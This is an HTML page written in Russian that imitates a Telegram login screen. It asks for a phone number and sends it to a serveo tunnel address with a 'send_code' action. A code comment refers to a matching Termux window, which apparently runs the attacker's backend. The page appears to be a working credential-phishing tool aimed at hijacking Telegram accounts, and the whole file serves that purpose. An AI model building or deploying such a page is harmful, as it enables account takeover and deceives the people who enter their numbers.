<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-sm text-center">
        <h2 class="text-xl font-bold mb-4">Войти в Telegram</h2>
        <input type="text" id="phone" placeholder="+7 900 000-00-00" class="w-full p-3 border rounded mb-4">
        <button onclick="sendData()" class="w-full bg-blue-500 text-white py-3 rounded font-bold">ДАЛЕЕ</button>
    </div>

    <script>
        // ВАЖНО: Проверь, что эта ссылка совпадает с Окном №2 в Termux!
        const API_URL = "https://db29717b97dd93df61249db4296703ad.serveousercontent.com/api/login";

        async function sendData() {
            const phone = document.getElementById('phone').value;
            try {
                await fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: "send_code", phone: phone })
                });
                alert("Данные отправлены! Проверь Termux и Telegram.");
            } catch (e) {
                alert("Ошибка! Проверь туннель в Termux.");
            }
        }
    </script>
</body>
</html>
